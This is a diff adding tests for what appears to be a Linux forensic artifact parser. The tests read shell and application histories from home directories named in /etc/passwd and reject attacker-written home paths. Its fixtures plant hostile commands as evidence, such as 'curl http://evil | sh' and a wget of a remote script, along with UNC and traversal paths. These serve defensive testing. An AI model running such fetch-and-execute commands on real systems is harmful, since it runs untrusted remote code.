@@ -5399,3 +5399,107 @@ def test_one_oversized_field_does_not_cost_the_whole_volume(tmp_path):
     finally:
         _csv.field_size_limit(was)
     assert paths == [huge, "/after"]
+
+
+
+def _passwd_tree(tmp_path):
+    """An acquisition whose /etc/passwd names homes outside /home and /root, one
+    that climbs out of the acquisition, and one that is every account's (/)."""
+    base = tmp_path / "[root]"
+    (base / "etc").mkdir(parents=True)
+    (tmp_path / "outside").mkdir()
+    (tmp_path / "outside" / ".bash_history").write_text("cat secret\n", encoding="utf-8")
+    (base / "etc" / "passwd").write_text(
+        "root:x:0:0:root:/root:/bin/bash\n"
+        "jdoe:x:1000:1000::/home/jdoe:/bin/bash\n"
+        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
+        "postgres:x:110:117::/var/lib/postgresql/:/bin/bash\n"
+        "climber:x:1001:1001::/../outside:/bin/bash\n"
+        "everyone:x:1002:1002::/:/bin/bash\n"
+        "gone:x:1003:1003::/nonexistent:/usr/sbin/nologin\n"
+        "broken line\n", encoding="utf-8")
+    for d, hist in [("home/jdoe", "ls\n"), ("var/www", "id\nwget http://x/s.sh\n"),
+                    ("var/lib/postgresql", "psql -c 'select 1'\n")]:
+        (base / d).mkdir(parents=True)
+        (base / d / ".bash_history").write_text(hist, encoding="utf-8")
+    (base / ".bash_history").write_text("not read: / is every account's\n", encoding="utf-8")
+    return base
+
+
+def test_shell_history_reads_the_homes_passwd_names(tmp_path):
+    """v0.7.166: a shell obtained through a service runs as its account, whose
+    home is rarely under /home."""
+    from artifact_engine.handlers import lin_bash
+    base = _passwd_tree(tmp_path)
+    rows = list(lin_bash.iter_history(base))
+    assert [(u, c) for u, _sh, _seq, c in rows] == [
+        ("jdoe", "ls"), ("www-data", "id"), ("www-data", "wget http://x/s.sh"),
+        ("postgres", "psql -c 'select 1'")]
+    homes = [u for u, _ in lin_bash._home_dirs(base)]
+    assert homes.count("jdoe") == 1 and "climber" not in homes and "everyone" not in homes
+
+
+def test_fish_history_is_read_with_its_times(tmp_path):
+    from artifact_engine.handlers import lin_bash
+    home = tmp_path / "[root]" / "home" / "bob"
+    fish = home / ".local" / "share" / "fish"
+    fish.mkdir(parents=True)
+    (fish / "fish_history").write_text(
+        "- cmd: curl http://evil | sh\n"
+        "  when: 1700000000\n"
+        "  paths:\n"
+        "    - /tmp\n"
+        "- cmd: echo a\\nb \\\\ c\n"
+        "- cmd: whoami\n"
+        "  when: 1700000060\n", encoding="utf-8")
+    out = tmp_path / "CSVs"
+    lin_bash.run(_ctx(tmp_path, out))
+    import csv
+    with open(out / "shell_history.csv", encoding="utf-8", newline="") as fh:
+        rows = [(r["user"], r["shell"], r["time_utc"], r["command"]) for r in csv.DictReader(fh)]
+    assert rows == [("bob", "fish", "2023-11-14 22:13:20", "curl http://evil | sh"),
+                    ("bob", "fish", "", "echo a\nb \\ c"),
+                    ("bob", "fish", "2023-11-14 22:14:20", "whoami")]
+
+
+def test_app_history_reads_the_homes_passwd_names(tmp_path):
+    from artifact_engine.handlers import lin_app_history
+    base = _passwd_tree(tmp_path)
+    (base / "var" / "lib" / "postgresql" / ".psql_history").write_text(
+        "select * from users;\n", encoding="utf-8")
+    out = tmp_path / "CSVs"
+    lin_app_history.run(_ctx(tmp_path, out))
+    text = (out / "app_history.csv").read_text(encoding="utf-8")
+    assert "postgres,psql,query,select * from users;" in text
+
+
+
+def test_a_passwd_home_is_judged_on_its_text_before_the_disk_is_touched(tmp_path, monkeypatch):
+    """A home in the evidence's /etc/passwd is attacker-written: on the Windows
+    host a UNC path or a drive in it would make the stat itself a network logon
+    or a read of the analyst's drive; `/.` and `/etc/..` are the root."""
+    from artifact_engine.handlers import lin_bash
+    base = tmp_path / "[root]"
+    for home in ("/\\\\attacker.example.local\\share", "/C:/Windows", "/c:", "/..\\..\\x",
+                 "/var/../../x", "/.", "/etc/..", "/", "relative/home", "", "/srv/a\x00b"):
+        assert lin_bash._passwd_home(base, home) is None, home
+    assert lin_bash._passwd_home(base, "/var/lib/./postgresql/") == base / "var" / "lib" / "postgresql"
+    (base / "etc").mkdir(parents=True)
+    (base / "etc" / "passwd").write_text(
+        "a:x:1:1::/\\\\attacker.example.local\\share:/bin/sh\nb:x:2:2::/.:/bin/sh\n"
+        "c:x:3:3::/etc/..:/bin/sh\n", encoding="utf-8")
+    touched = []
+    real = Path.is_dir
+    monkeypatch.setattr(Path, "is_dir", lambda self: touched.append(str(self)) or real(self))
+    assert list(lin_bash._passwd_homes(base)) == []
+    assert not [t for t in touched if "attacker" in t]
+
+
+def test_an_empty_fish_entry_does_not_lend_its_time_to_the_one_before(tmp_path):
+    from artifact_engine.handlers import lin_bash
+    f = tmp_path / "fish_history"
+    f.write_text("- cmd: whoami\n- cmd:\n  when: 1700000999\n- cmd: id\n  when: 1700000000\n",
+                 encoding="utf-8")
+    # the empty entry keeps its own time; whoami, before it, has none
+    assert list(lin_bash._fish(f)) == [("", "whoami"), ("2023-11-14 22:29:59", ""),
+                                       ("2023-11-14 22:13:20", "id")]
